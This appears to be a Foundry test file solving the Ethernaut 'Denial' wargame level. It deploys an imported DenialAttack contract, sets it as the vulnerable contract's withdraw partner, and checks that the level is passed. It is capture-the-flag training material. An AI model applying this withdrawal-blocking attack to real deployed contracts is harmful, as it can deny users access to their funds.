pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Denial/DenialAttack.sol";
import "../Denial/DenialFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract DenialTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    address eoaAddress = address(0);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testDenialAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value : 1 ether}(denialFactory);
        Denial denial = Denial(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        DenialAttack denialAttack = new DenialAttack();
        emit log_named_address("Denial attack", address(denialAttack));
        denial.setWithdrawPartner(address(denialAttack));

        emit log_named_address("New partner", denial.partner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}